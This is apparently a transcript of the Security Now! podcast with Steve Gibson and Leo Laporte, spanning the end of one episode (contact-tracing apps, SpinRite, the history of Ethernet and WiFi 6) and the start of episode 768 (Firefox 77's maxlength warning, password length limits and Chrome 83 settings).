Finally, question:  "Why aren't you using just Bluetooth like Apple and Google are, or utilizing the API that Apple/Google built?"  Their answer:  "Bluetooth on its own gives a less accurate picture" - actually, as we know, deliberately nothing but contact information - "a less accurate picture than Bluetooth and GPS location data.  The goal of Healthy Together is to allow public health officials to understand how the disease spreads through the vector of people and places, and both location and Bluetooth data are needed to accomplish that.  Bluetooth helps us understand person-to-person transmission, while location GPS data helps us understand transmission zones.  Having both of these important data points provides a more effective picture of how COVID-19 spreads.  This data helps policymakers make the best possible decisions about how and where we begin to relax and modify restrictions as our community and economy begin to reactivate."



And I say hallelujah.  Again, if there was something I could download for California, I would put it in my phone and turn it on and share my location data, which as I said is very non-exciting.  But I would love to get a notification, if after the fact I'm informed that where I was at the time I was, people were getting infected.  To me that would be useful and certainly worth the tradeoff.  And again, it's not for life.  It's not forever.  All of that is self-expunging after 30 days, as it should be.  That's correct design because nothing matters past that point.  I just think it makes a lot of sense.



So as everyone knows, I saluted the technology from a crypto standpoint of what Apple and Google did.  That's what we analyzed.  Bruce Schneier thinks all of this is nonsense.  But  boy, voluntary location tracking, I don't know, Leo, you've probably see some of the news where already anonymized cell phone data has been used just to watch people.  There was one where the aggregate of people who were on a certain day in a  meatpacking plant, their phones were anonymously followed as they just dispersed literally across the country, and it was just fascinating to see how valuable that kind of location data is, even if you don't know who it is.



LEO:  Right.  No, we've seen a lot of that, actually.  Presumably anonymous.  But still, yeah.



STEVE:  Yeah.  SpinRite.  Work is continuing quite well on the project.  Yesterday, before switching to work on this podcast, I posted my just-completed, full, from scratch, FAT-partitioned formatting code.  It's just a simple, I think it was 8K before I signed it so that Windows would be happy.  And that exploded it to 18K.  But okay.  People were saying, "Hey, Windows says it doesn't know who the publisher is."  I'm like, ooh, I forgot to sign it.  But anyway, I need SpinRite's thumb drive boot installer to be able to work on any old or new thumb drive the user might have around, regardless of that drive's history, because who knows what users will have.



SpinRite's current installer, which I wrote back in 2004, as I think I mentioned on the podcast last week, I was shaking my head because there was code in there for doing this on Windows 95.  Anyway, it's showing its age and is in need of some rework.  So I wrote a, from scratch, FAT12, 16, and 32 partition formatter that will just take any thumb drive it is given.  It'll remove what's there, install a master boot record.  That's the next piece of work I will start on this evening, and then put a FAT format partition of whatever size is necessary based on the size of the drive, and then install FreeDOS and the test code that we'll be using.  And that should be finished pretty - that'll be finished shortly.  And at that point everyone will be able, who's testing, to more easily boot the testing code on their own machines.



And then the new AHCI driver code that I've talked about before, I'm still - there's a couple little cases I'll get back to, some specific chipsets where it looks like it's still, as I mentioned before, there was some chipset, I can't remember now, where it just wasn't supporting a couple bits in the spec, and I was expecting they all would.  This one didn't.  So I was like, okay, fine.  I can work around that.  So there will be a couple more things like that.  Anyway, it's why I'm excited to put this code out as a really cool raw performance benchmark for all of this podcast's listeners.  Everyone will be able to play with it.  I'm sure we will find additional systems where there are some problems.  I want to find them because I want to fix them.  So anyway, we'll be able to involve everyone here before long.  At the moment we're just working in the GRC spinrite.dev newsgroup.



Okay.  I titled this "WiFi 6," the podcast, because that's where we're going to end up.  But I thought it would be interesting to do a bit of historical framing to place WiFi 6 into the context, historical context, since as I mentioned the 47th anniversary of the invention of Ethernet - not the Internet, of Ethernet, although they pretty much were coincidental, as we'll see - three days from now on, where is it, May 22nd, 1973.



So Ethernet was invented by a guy named Bob Metcalfe.  Nice guy.  He and I were on a couple panels back in the day.  We've talked a lot on this podcast about packet switching.  Bob is one of the people who built some of the very first hardware.  In 1970, while I was rapidly falling in love with assembly language on a PDP-8, and Bill Gates was playing with a newly installed teletype at his high school, which was hooked to a remote timesharing system, Bob Metcalfe was building an interface known as the IMP, I-M-P, which stood for Interface Message Processor.  It linked a PDP-10 at MIT to the ARPANET, as it was known at the time.



Three years later, in 1973, after building a second IMP host interface at Xerox PARC, which is where Bob was, he was assigned the task of somehow extending the ARPANET into buildings full of PARC's personal computers, which of course at the time was the only place in the world where it had occurred to anyone that computers might actually be personal.  It was on May 22nd of 1973, in three days 47 years ago, that Bob wrote the memo inventing Ethernet.  So today, 47 years downstream, more than 1.2 billion new Ethernet ports are shipped every year.  One third of them are wired; two thirds of them are WiFi.



So let's follow the path that leads from there to today's WiFi 6.  Bob's wired Ethernet first appeared commercially in 1980 and was standardized by the IEEE, that's the Institute of Electrical and Electronics Engineering.  It was standardized as "I Triple E" 802.3.  And of course it would become a growing family of electrically connected Ethernet adapters over time.  Three years later, in '83, we had 10 mbps, with 10Base-5, which used a thick coax cable, not very easy to work with.



In '85, two years later, the much more popular 10Base-2 switched to a much more manageable thin coax.  That's the first one I used when I ran that horseshoe loop around the building.  You had to do a horse - it was like a straight line.  You had terminators on each end so that the signal that hit the end would not reflect back.  It would just it would absorb it smoothly.  And then you put T adapters to sort of T connect into the thin cable wherever you had a PC.  So we had a sort of a facility early in GRC's day where a big U-shape allowed us to connect everyone's machines.  And it was like, wow, this is amazing.  In 1990, we got 10Base-T, where the T stood for "twisted."  That was twisted pair, which initially ran at the same 10 megabits.  Then five years later we saw the jump to 100Base-T.



That brings us to 1995, which was also known as Fast Ethernet because now 10 megabits was slow.  And that of course gave us a tenfold jump to 100 mbps.  In '98 we got 1000Base-X, which was for one gigabit over fiber optic cabling.  And the next year engineers had figured out how to deliver the same speed over the much more convenient multiple twisted pairs, giving us 1000Base-T.  In '97, when our 100Base-T was then a couple years old, engineers began looking at wireless.  Whereas the family of wired Ethernet were all 802.3, the IEEE assigned 802.11 for their work on taking the same time-proven Ethernet technology wireless.  The very first 802.11 was mostly experimental, so this again, first wireless Ethernet.



It was quickly followed up two years later, in '99, by 802.11a.  Whereas the first 802.11 operated in the 2.4 GHz band, and was only able to deliver around one to two megabits per second, 802.11a moved into the 5 GHz band with a physical, so it's like a technical maximum bit rate in the air, of 54 mbps.  But it also relied upon a lot of forward error correction so that it ended up delivering an effective data rate kind of down in the mid-20 mbps range.  The 2.4 GHz band was already and now to the point of being crowded with microwave ovens, Bluetooth, baby monitors, cordless telephones.  Some amateur radio equipment operates there.



So moving 802.11a into the relatively unused 5 GHz band gave it a significant advantage.  But the higher carrier radio frequency, 5 GHz versus 2.4, brings some tradeoffs, since a higher frequency means a shorter wavelength, and a shorter wavelength increases the signal's absorption by walls and other solid objects in their path.  So again, sort of a tradeoff.  And we'll see we're moving, sort of jogging back and forth between these two bands.



As a consequence of the fact that 5 GHz was okay, but causing some problems, the next move was to work to improve the data performance of the inherently more robust 2.4 GHz lower frequency band.  That gave us 802.11b.  And products starting 20 years ago, back in the year 2000, were based on 802.11b.  It used a more advanced carrier modulation scheme to deliver a maximum effective bit rate of around 11 mbps.  The products were inexpensive and plentiful, and WiFi really began to take off because it was like, okay, now this thing works.  And since 802.11a operated at 5 GHz, and 802.11b operated at 2.4 GHz, it was feasible to create dual-band WiFi, known as 802.11a/b.



Three years after that, 802.11g delivered a third carrier modulation standard for the lower band 2.4 GHz.  It managed to deliver the same 22 mbps throughput of the much more finicky 5 GHz 802.11a, while operating in the inherently longer range, but more congested, 2.4 GHz band.  And as with 802.11a/b, all three modes then were often combined to yield 802.11a/b/g.



So at this point things had become a bit of a mess.  Just evolution does that.  So work was undertaken to pull all of the various amendments to the original 802.11 together to figure out what to do next.  The result of that work emerged by the end of 2009, and that was 802.11n.  And even though, and we talked about this on the podcast at the time because we were here then, the industry didn't actually wait for the publication of the formal standard.  It jumped the gun by a couple years by following the first draft specification two years previous.  There was just too much pent-up need.  And everyone figured, well, okay, we hope when 802.11n is formalized, that we're still certified, or we will be able to get certified.  Because right now we're just hoping this is what it's going to be.



802.11n combined everything.  And it would later come to be retroactively labeled WiFi 4 by the Wi-Fi Alliance.  So this is their attempt to begin, you know, they recognized, okay, this is an alphabet soup of confusion for the typical consumer.  Let's drop all of this 802.11a/b/g/d/e/f and just say WiFi 4.  So that's what 802.11 later became named as, retroactively.  The other thing it introduced was the three-antenna MIMO, M-I-M-O, Multiple Input/Multiple Output system.  And being that it pulled everything together, operates on both the 2.4 and the 5 GHz bands, although support for 5 GHz technically is optional in the spec.



Okay.  Seven years ago, in 2013, this 802.11n, also known now as WiFi 4 standard, had its 5 GHz transmission channel bandwidth significantly widened from 40 MHz to 80 or 160.  The wider the band, the higher the data rate you're able to use in that band.  You have more bandwidth.  And the encoding of the data jumped from 64 QAM, which is Quadrature Amplitude Modulation, to 256 QAM.  So it jumped from encoding six bits at a time to eight bits at a time.  And since it's all just silicon, they also defined something known as Multi-User MIMO, MU-MIMO, all of which results in where we went next, 802.11ac, which was also later retroactively labeled "WiFi 5."  So it took 802.11n and widened the channel bandwidth and improved the modulation scheme to be able to store eight bits in a time interval where before they could only store six.



But we should pause our history here for a minute to talk about this.  The original Ethernet used a system, that is, to talk about this MU-MIMO, the Multi-User MIMO, the original Ethernet used a system which we talked about on this podcast years ago, back in our earlier tutorial phase, known as Carrier Sense multiple access with collision detection.  That's what Bob invented back then.  That was the essence of his genius.  It was essentially a party line.  And remember the old days, I think this predates both of us, Leo, but like the first telephones, you actually often had multiple subscriber lines, they were also known as, where you'd pick up the phone...



LEO:  Party lines.  Party lines.



STEVE:  ...yeah, to see if anybody was already using it.  And if not, you would maybe, what, flash the hook switch in order to get the attention of the operator and then have her connect you somewhere.  And if you picked the phone up, and there was already a conversation going on, politeness required that you not eavesdrop, but that you put the phone back down on its hook and then come back later.



LEO:  Marge, I told her when I came in there that I really didn't like the way she was wearing her hair.  And then...



STEVE:  Exactly.



LEO:  Yeah.  Really awful.



STEVE:  Exactly.



LEO:  I'm talking here, Leo.  Get off the phone.



STEVE:  How much longer are you going to be?  You've been on for the last three hours.



LEO:  Yeah, exactly, yeah.



STEVE:  There's still plenty of rural areas where they don't have enough carriage capacity to have anything but a party line, believe it or not.



LEO:  Today, still?



STEVE:  I've heard from people who say, yeah, we still have a party line.  Maybe that's - yeah.  Isn't that amazing?



LEO:  Wow.



STEVE:  Well, in a sense we all have WiFi, so we do have a party line still.



LEO:  That's true, yes. 



STEVE:  Bob's invention, his brilliant invention, was to figure out how to create a simple solution that allowed multiple nodes to share one medium.  It was initially coax, then it went to twisted pair.  Although the topology for twisted pair was not the same T connection, just sort of tie in.  But the concept was essentially a party line.  The idea was that someone wanting to send data to someone else would listen on the connection until the shared coax was quiet.  Then they would transmit their data.



But it was entirely possible, especially on a busy shared network with many nodes, that multiple parties who were listening for a pause might start transmitting at the same time.  Back when Ethernet used coax, such a collision would actually create a higher voltage swing on the coax because of two transmitters trying to do the same thing at the same time.  That was readily detected by everyone on the line.  So the parties who were responsible for that jam-up would wait a random length of time.  They would back off a random length of time before retrying to send, also listening to make sure that the line was still quiet.



So the system was elegant, simple, clever.  And later, when twisted pair wiring was used, there was not that overvoltage event.  So the transmitting parties would listen to the line while transmitting to see whether they were able to reliably receive the message they had sent.  If not, that meant that someone else had collided with them, transmitting and interfering.  So again, each party would back off a random interval and retry.



So the point was Ethernet has always been a shared medium technology.  When semi-intelligent Ethernet switches replaced simple repeater hubs, things got better for twisted pair, since the semi-intelligent switches could dynamically learn the network topology by building a table of which Ethernet MAC addresses were connected to which of their ports.  So now, with that technology, rather than simply sending anything incoming back out of all ports, the incoming data would automatically be routed out of only one port, where the destination MAC address had previously been seen and was known to reside.  So this hugely reduced packet collisions within large networks.



And that's the one problem with Ethernet - we see this also with the shared medium of the air, which we're all using now with WiFi - is that, if you think about it, and all kinds of academic research has been done about the shape of the curve of the collapse of Ethernet, when too many people are trying to talk at once, because what this elegant simple system lacks is a means of handling too many people.  That is, it basically collapses.  And you mentioned Token Ring at the beginning.  That's the approach that IBM took where a virtual token circulates in a ring.  The person holding the token has permission to speak.  When they're done, they pass the token to the next station.  That's the way IBM did this.  But they didn't win.



Bob's simple system, which it sort of models the Internet in how it's, you know, you wouldn't think it works.  It's simple.  It's clever.  You mean I'm just going to put this packet on the wire, and I don't know how it's going to get there, but it is?  Uh-huh.  That's right.  Similarly, you mean I just wait till nobody else is talking, and then I can talk?  Uh-huh.  Yeah.  Of course, if everyone's trying to talk at once, you have a problem.



Okay.  So the point is that switching helped a lot.  So 802.11ac, also known as WiFi 5, introduced this MIMO technology.  It was actually defined, and equipment was certified, in two rounds over time, that is, 802.11ac, the second round only more recently in 2016, which added the higher bandwidth capabilities of Multi-User MIMO, the widest of the channel expansion, to 160 MHz channel bandwidth and additional 5 GHz channels.  It also doubled the number of spatial streams with four antennas versus three, which were in that first round.



And I thought I said somewhere here, I don't see it, where I explained that the way this MIMO technology worked was very cool.  The access point initially had three antennas.  It would use varying phase of its transmitted signal where the phases would, depending upon the angle of the receiver to the antennas, it would create null zones where the phases canceled and extra power zones where the phases summed.  And so the access point would periodically poll the receivers, saying how do you hear me now, how do you hear me now, how do you hear me now, using different phases among the antennas.  The receivers would send back a "how loud" that was.



And what that did was it allowed the access point to adaptively learn effectively where these receivers were, assuming, which is often the case, they are relatively fixed in an environment, and to then essentially do beam forming.  That is, if it knew it was sending something back to a given receiver, it would look in its table to see what it may have learned about the receivers' self-reported optimal phase of the antennas and then use that phase essentially to beam this signal to that receiver, minimizing interference where the phases were not aligned and were out of phase.



So again, not something you want to wire up in the backyard.  But once it's all on silicon, it doesn't cost anybody anything except some extra transmitters, and those are cheap now.  So that brings us to 802.11ax, also known as WiFi 6.  802.11ax aims to quadruple a single access point's overall data exchange capacity, the benefit of which will most be heavily felt in heavily used multi-client environments because it's not like one client gets four times the throughput, no.  It's that the system degrades far less quickly.  As I said, you can imagine everybody talking at once.  That's the failure case of Ethernet because you end up just with constant collisions and everybody backing off and trying again, then more people talking.  So an individual gets 30% more performance out of an 802.11ax than WiFi 5.



So WiFi 6 gives about a 30% boost.  But when you've got a lot of clients of an access point, then you begin to see an improvement.  It also uses this so-called multi-user MIMO, which can be sort of thought of as spatial domain multiplexing.  That is, it multiplexes the space around the access point by learning what individual users are doing to reduce inter-client interference.  And then to this notion of the spatial domain multiplexing, "ax" significantly enhances what's known as frequency domain multiplexing with what's called MU-OFDMA, Multi-User Orthogonal Frequency Division Multiple Access.  It's a fancy way of saying that the entire available spectrum that the access point has allocated to it is dynamically divided into a very much larger number of very much smaller individual subcarriers.  And by very large number I mean 2,048 individual subcarrier channels.



So this allows a much higher level of individual attention to be given to each client.  Clients are essentially able to receive not only a signal, a radio signal aimed at them, which the access point learns, but they're also able to receive their own allocation of subcarriers that will inherently not collide with other clients in the area.  So essentially it's managed to take what would look like a huge shared medium and create both essentially physical beams and radio channels within that region in order to divide that monolithic space up into the ability to serve individual clients.



So this is the kind of thing which in huge auditoriums and stadium settings you would want tons of these access points spread around and expect to get much better performance.  Except you need to have a compatible client.  Of course the system works with down spec clients with no problem.  But you don't get a lot of these features because they are negotiated between the access point and the client on the fly, unless you've got matching WiFi 6-compatible clients.



Oh, and one other thing, too.  There's a significant power savings available for mobile clients, thanks to something known as "Target Wake Time" (TWT), where the access point and the client are able to negotiate silent periods which allow the client to shut things down and not worry.



And then in a final piece of news, just last month the FCC delivered some very good news to the WiFi industry overall by agreeing to open and make available a significant chunk of new bandwidth, so-called "unlicensed bandwidth," in the 6 GHz band.  This is an additional 1200 MHz worth of WiFi spectrum which will add 14 80 MHz channels and seven 160 MHz channels.  So we can expect to see further reduced interference, even lower latency, gigabit speeds, and higher capacity for simultaneously managing many more devices.



And I forgot to mention that one of the things that WiFi 6 also does is it expects to dramatically cut client latency by 75%.  And anybody who's ever tried to use satellite Internet, I know that Elaine had satellite Internet for a while where she was, it's just - it's really a pain.  Latency is just a thrill killer in Internet use.  So WiFi 6 should improve that, too.



I was getting ready to make the move myself to WiFi 6.  But since I don't yet have many other WiFi 6 client devices, and since last month's chunk of new unlicensed bandwidth means that there will be another generation of access points coming along, I think I may wait until the newer access points, which include the 6 GHz band, hit the market.  But I don't expect those devices soon, since it'll likely require some tooling up of new silicon and some radio design from scratch.  So anyway, depending upon your need for WiFi 6 today, you might choose rationally to wait or just say, hey, I want those features now.  I think, Leo, you said you were going to jump to 6.



LEO:  I have 6 now with my Orbi.  Yeah, it was very, very expensive.  And I guess it's better.  The problem is so few WiFi 6 devices.  So the iPhone 11 is.  You have that.  The MacBook Air, the new MacBooks are not.  My Dell XPS, the brand new one, the 2020, is.



STEVE:  Actually, I have an iPhone 10.  Do I have 6 or 5?



LEO:  No, you have 5.



STEVE:  Oh, yeah.  And then I have a whole bunch of old iPads.



LEO:  Yeah, and I don't think even the newest iPad has WiFi 6.  So it's silly to get it.  It's a huge expense.  And as you say, 6E is coming.  So I would defer until you - and then you'll have enough.  It's really - I think 6E is really aimed at IoT devices because it's such a high frequency that it's not going to go through walls at all.  So I think it's really intended more to handle the vast number of IoT devices we now find in people's houses than anything else.  I know.  I'm really, you know, I'm - you know what we're doing?  We're getting a guy come out, going to put in Ethernet, Bob Metcalfe's brilliant invention, in every single room.



STEVE:  I'm totally with you, Leo.  I was thinking about that while I was reading this.  And it's useful to have WiFi where you need portability.  But my own network here, I'm 100, well, you know, I mean, you really don't want any podcasters to be trying to do this with WiFi.



LEO:  No, because of the collisions, because of that collision-based system, yeah.



STEVE:  Yeah.  Nothing is better than wired.



LEO:  Now, I think 6 - did you notice whether that collision detection is still in 6?  I get the feeling that they were trying to do stuff to avoid that.



STEVE:  Well, they really are.  So that whole spectrum allocation technology...



LEO:  Oh, okay, that's the idea is we'll just be on different frequencies, and it won't matter.



STEVE:  Exactly.



LEO:  Of course, there aren't that many frequencies.  Even though it says zero to 11, there's really only three bands you can operate in, in those 11 frequencies, or 12 frequencies.  So it's not like we've got all the spectrum everywhere.  But it'll be nice to have more channels, have 6E.  It'll be good.  You know what, I love it when you do the explainers, to be honest with you.  So I hope there's no security problems next week, and we can find another topic...



STEVE:  Who knows what I'll come up with to talk about.



LEO:  Yeah, yeah, a lot of fun.  Steve Gibson's at GRC.com.  That's his website.  That's where you'll find SpinRite, of course, the world's best hard drive maintenance and recovery utility.  Recommended it on the radio show on Sunday, actually.  A guy had a perfect example of a drive that SpinRite could help.  You can also find lots of free stuff there, including ShieldsUP! to test your router and all sorts of information and a lot of little rabbit holes you can crawl down and find out things about including SQRL.  There's a SQRL down that rabbit hole.  And Vitamin D, you know, I just read another study that said Vitamin D seems to be a strong indicator in your chances of surviving COVID.



STEVE:  They keep coming out, yeah.  They're seeing real correlations between Vitamin D status and how you do if you get infected.  



LEO:  Yeah, yeah.  So I'm taking my 5,000 IUs every morning, thanks to you, as I always have.  Anyway, it's all there, GRC.com, including, by the way, this show in two unique formats.  He has a 64Kb audio.  We've got that, too, at TWiT.tv.  But he also has a 16Kb audio.  Sounds a little scratchy.  Sounds like Alexander Graham Bell.  But it's small.  And that's its advantage.  There's also another very small file format, text, a very nice transcription.  Elaine does those.  And those are both available at GRC.com in the Security Now! area.



We have 64Kb audio.  We have video, as well, if you want to watch.  All of that's at TWiT.tv/sn.  It's on YouTube, as well.  A lot of people do that.  You can listen on your favorite voice-activated device.  Just say "Echo" or "Google" or whatever, "Play Security Now! podcast."  You'll hear the latest episode.  We do the show on Wednesdays.  I'm sorry, Tuesdays.



STEVE:  Tuesdays.



LEO:  Used to be Wednesdays.  Tuesdays, 1:30 Pacific, 4:30 Eastern, 20:30 UTC.  So if you're around at that time you can watch us do it live at TWiT.tv/live.  On-demand downloads available at TWiT.tv/sn.  Best thing to do, subscribe.  That way you'll get it the minute it's available, audio or video.  Just find your favorite podcast application and sign up today.  It'll cost you nothing, despite the word "subscribe," which I think has always scared people off, like you're paying for it.  But you're not.



Steve, thank you so much, sir.  We'll see you next week on Security Now!.



STEVE:  Right-o.



Copyright (c) 2020 by Steve Gibson and Leo Laporte.  SOME RIGHTS RESERVED.  This work is licensed for the good of the Internet Community under the Creative Commons License v2.5.  See the following Web page for details:  https://creativecommons.org/licenses/by-nc-sa/2.5/.




GIBSON RESEARCH CORPORATION		https://www.GRC.com/



SERIES:		Security Now!

EPISODE:	#768

DATE:		May 26, 2020

TITLE:		Contact Tracing Apps R.I.P.

HOSTS:	Steve Gibson & Leo Laporte

SOURCE:	https://media.grc.com/sn/sn-768.mp3

ARCHIVE:	https://www.grc.com/securitynow.htm



DESCRIPTION:  This week we begin with some browser news to examine a nifty new trick to be offered by the next Firefox 77, and spend a bunch of time on the many new features - and how to enable them - being offered in Chrome's 83rd edition.  We also look at Adobe's four emergency out-of-cycle patches, and a surprisingly robust and well designed new jailbreak for iPhones. We take a look at a surprisingly powerful DNS amplification attack with a packet count multiplier of up to 1,620, the sad but true complete collapse of Bluetooth connection security, and the odd report of eBay scanning their users' PCs.  We share a bit of closing-the-loop listener feedback and a quick bit of miscellany, then I editorialize a bit about why I'm very sure that contact tracking apps are dead on arrival.



SHOW TEASE:  It's time for Security Now!.  Steve Gibson is here with updates on Firefox 77, Chrome 83, and why you can never trust your Bluetooth device again.  It's all coming up next on Security Now!.



LEO LAPORTE:  This is Security Now! with Steve Gibson, Episode 768, recorded Tuesday, May 26th, 2020:  Contact Tracing Apps R.I.P.



It's time for Security Now!, the show where we talk about your security, privacy, safety, health, and technology.  I loved last week.  Steve Gibson is here.  He's the Explainer in Chief.  He did a great job on WiFi 6 last week.  I really appreciated that.



STEVE GIBSON:  I got more feedback on that than I've had in a long time, Leo.



LEO:  I loved it, yeah.



STEVE:  I was sort of actually a little self-conscious about  did everyone want to have that.  But the answer was yes, apparently.



LEO:  You have a little schmutz on your chin.



STEVE:  I know, what the hell is that?



LEO:  It looks like a mouse pointer.



STEVE:  I just tried to wipe it off the screen.



LEO:  No, it's us.  If I could get somebody in the main studio just to move that.  Oh, don't eat it, no, it's - oh.  That'll - can you delete - can you move the mouse, John or Burke?  Oh.  I don't know if there's anybody there.  Hello.  Oh, there it is.  There it is.  It's moved.  Whew.  That was close.  We're in a funny mood today, I'll tell you.



STEVE:  Okay.



LEO:  So yes, I enjoyed the WiFi 6 because you explain stuff so clearly and well, and I've always enjoyed those kind of computing fundamentals episodes we did way back when.  So anytime you want to do that...



STEVE:  Well, and, yeah.  And they're still there.  But it's just not possible to get people to, like, we're all busy, and everyone wants to know what's going on.  And there's a sense of, like, oh, no, we need new.  So anyway.



LEO:  We've got to do both.  We've got to do both.  You're the king of security news.



STEVE:  So we have Episode 768 today for May 26th, our last podcast of May.  Where is the year going, Leo?



LEO:  Wow, yup.



STEVE:  It's just zooming by.  I didn't have a title for this initially.



LEO:  By the way, it can continue to zoom, go by fast.  Go, 2020.  Not my favorite year.  No, no.



STEVE:  Yeah.  Unfortunately it's going to be a necessary part of solving the 2020 problem is living through it and acquiring herd immunity one way or the other.  So I read something about some research that some modelers had done in the U.K. about the percentage of people who would have to be using contact tracing apps in order for the system to be effective.  Thus the title, "Contact Tracing Apps R.I.P."



LEO:  Uh-oh.



STEVE:  It's just - and that also gave me a segue, though, to sort of pull all this together.  So we're going to end up talking about that a little bit.  But we're also going to begin with some browser news to examine a nifty new trick to be offered by the next Firefox 77; and we're going to spend some time on the many new features, mostly on how to enable them, being offered in Chrome's 83rd edition, which just came out.  And there's like a whole bunch of cool stuff, but they're all turned off.  So it's like, hello, okay, well, we want them, and they're all good, so we're going to turn them on.



LEO:  Oh, good.



STEVE:  We've also got Adobe's four emergency out-of-cycle patches.  We won't spend much time on that because, again, how can you have a remote code execution in something that animates characters?  I don't know.



LEO:  Oh, god.  Oh, geez.



STEVE:  We've got a surprisingly robust and well-designed jailbreak for iPhones.  I heard you guys talking about that on the previous podcast, on MacBreak.  We take a look at a stunningly powerful DNS amplification attack with a packet count multiplier of up to 1,620, Leo.



LEO:  Wow.



STEVE:  And in fact it's so powerful that it was responsibly disclosed, and it didn't come to light until most of the vendors had patched their DNS in order to resolve it.  So we're talking about it now because it's not such a big problem.  We've also got a startling event which, I mean, even as I say this, and as I was writing it earlier, I'm thinking, really?  It's the sad but true complete collapse of Bluetooth connection security.  It's just gone.



LEO:  Oh, that's not good.



STEVE:  No, that's not good.  Tell that to your front door lock and your garage door system and lord knows what else.  Your security system.  We also have an odd report of eBay scanning their users' PCs.  Turns out not exactly what was happening, but sort of interesting.  Then we've got a bit of closing-the-loop listener feedback; a quick little bit of miscellany about two shows I wanted to discuss with you quickly.



LEO:  Oh, good.



STEVE:  And then I'm going to editorialize a bit about why I'm quite sure that contact tracking or tracing apps are DOA.  It's just not going to happen.  And as you already observed, we do have a pretty wonderful Picture of the Week.



LEO:  Oh, it's good.  It's very good.  Steve?



STEVE:  So our Picture of the Week.  I thought, you know, I wonder if this is on the 'Net anywhere.  So I just, while you were talking, I brought up Google, and I typed in "Windows 10 we finally."  And that's all it took.  Because I was thinking it would really make great wallpaper.  And anyway, for those who are not on the video feed, this Picture of the Week says "Windows 10:  We finally fixed everything."  And it just shows the most screwed-up-looking passenger airliner.  Actually, maybe not because there's no windows.  I don't know what it is.  But it's got like landing gear above the cockpit, facing the wrong direction.  The wings are rotated 90 degrees, so instead of being at 3:00 o'clock and 9:00, they're at 12:00 and 6:00.



Anyway, it's quite wonderful.  So if you're feeling like it's time to change your wallpaper, you just google "Windows 10 we finally," and it'll bring up plenty of hits of this because this turns out to be quite popular on the Internet.



LEO:  It would go well on my Linux box, I think.  It'll be very pretty.



STEVE:  Yeah, it's perfect.



LEO:  Yeah.



STEVE:  A reminder of why you're...



LEO:  On Linux.



STEVE:  ...having a much better time now.



LEO:  Yeah, yeah.



STEVE:  So Firefox 77.  We're currently at 76.  It's going to pick up a nifty new trick.  And I don't - well, okay.  So  one of the attributes of fill-in fields on an HTTP web form, any field can be given an attribute, a property called "maxlength."  So a web page's coder can instruct the web browser to stop accepting user input beyond a specified length.  It just, you know, if you set it to, like, five, for example, it would take five characters, and then it just won't take a sixth character, for example.



Anyway, supposedly, though this is something I don't ever recall encountering myself, there are websites that use this maxlength specification on their account creation and subsequent login password input fields.  Okay, now, first of all, that's a very bad idea, but we'll get to why in a minute.



LEO:  No kidding.



STEVE:  So as a result, when a user pastes a longer password, probably created by a good random password generator, into a shorter field, the browser, which has been clearly instructed to admit text no longer than "x" characters, will indiscriminately discard the overage without providing any user feedback.  The website itself, the server at the other end, has no way of knowing that an attempt was made to paste more into the field since this truncation was all handled on the browser's end.



Now, as long as the site never changes its mind about the maximum length of passwords, and the user always goes about pasting the overly long password string into the too-short field, everything should be okay; right?  Because the website would always be receiving the same first "n" characters of a user's pasted password.  But it's certainly conceivable that a site might, at some point, wish to modernize its authentication handling and, for example, increase its password length.  For example, some random HIPAA or other regulation might say thou shalt allow passwords of up to "x" characters.  And so to be compliant, the site might then be forced to widen its password length aperture to comply.



So now suddenly more of the user's same password would be admitted, and a great deal of breakage and hair-pulling would ensue.  So we're currently, as I said, at Firefox 76.  The next major release will bring an interesting new feature.  I guess this is something that actually does happen to people, although as far as I know, I haven't ever encountered it, as I said.  Since the web browser knows when we've attempted to enter or paste more characters into a field than that field has been configured to accept, starting with Firefox 77, when this is attempted, there will be an immediate bright red rectangular highlight with a message that says, "Please shorten this text to 'n' characters or less.  You are currently using 'y' characters."



So I guess it wouldn't apply to inputting because you would be typing, and maybe you'd stop seeing it going in.  On the other hand, password fields are often obfuscated with the big black dots.  And if you kept typing, you might not know that they were no longer being accepted.  So it'd be interesting to see exactly how Firefox handles that.



But anyway, it's just sort of a random weird thing that, again, poor site design.  But on the other hand, there's no protection from poor site design.  And I'll conclude, just by reimplanting what everyone in this audience very well knows.  Password length limits are dumb.  Period.  Dumb dumb dumb.  There's absolutely no conceivable justification for them.



Every recipient of the password, that is, someone who receives a password should immediately hash it; or, even better, in the browser, before it is even sent over the wire, script that is handling the form submission should pick a random salt, use it to drive a PBKDF (Password-Based Key Derivation Function), and then send the resulting hash with the salt over the wire so the recipient never has it in the clear.  There's never any reason for any employee of the website, the recipient, to have or to see the password in the clear.  They never have any need or reason to send it, or read it over the phone, or check it versus what, you know, in a conversation.  The only proper way to deal with passwords that cannot be supplied for whatever reason is to have the user somehow reauthenticate their identity through some other means.



Unfortunately, and typically, the only way to do that is by having them able to receive email at a previously registered address, and then send the "password forgiveness link" to that email account.  It's not great, but it's the way the world works today.  So anyway, it makes sense for a password to be required to meet minimal complexity requirements which can be enforced by some script on the web browser.  But there's just no good reason to place a cap on a password's maximum length or complexity.  There just isn't.  I can't think of a single good, I mean, yes, I get it that there are, like, backend mainframes at CompuServe still running Cobol that have a wired-in password length of 12.  But in that case, take 12 digits from the hash and store that, rather than the password.  Just there's no reason to limit what the user can do.  So anyway, that's Firefox.



We just got Chrome 83 that we were talking about because remember that when the stay-at-home mandate landed we were at 80.  And 81 was planned, but then was delayed.  And because I guess Google is running on a calendar, they just said, well, we don't have time to do 82, so we're skipping it.  But we're going to give everybody 83 on schedule.  And so that's what happened.  So we just jumped from 81, I had 81.0.4044.183, looks like an IP address all except for the 4044, that would not work, and then went over to 83 dot whatever.  And we got a bunch of new goodies.  There were 38 security problems fixed, but mostly lots of UI improvements.



And I guess in the interest of rolling these out slowly, they're not enabled for anybody right now, which is - I don't get it.  But at the same time I did have Chrome stop receiving Ctrl+Vs.  I wasn't able to paste into Chrome after I turned all these on.  I don't know that there's any connection between that happening.  I think I've had that happen before in Chrome's DOCS app.  And so I just closed Chrome and started up again, and then I was able to paste again.  But anyway, that did happen.



So we have cookie management, both for Incognito and regular modes, simplified and clarified.  We've got global and per-site website settings made more clear.  The Site Settings control has been reorganized into two separate sections to make it easier and more clear.  People item has been renamed to You and Google, which is where the sync controls are now located.  And Google says that many people regularly delete their browsing history, which I didn't know about or of.



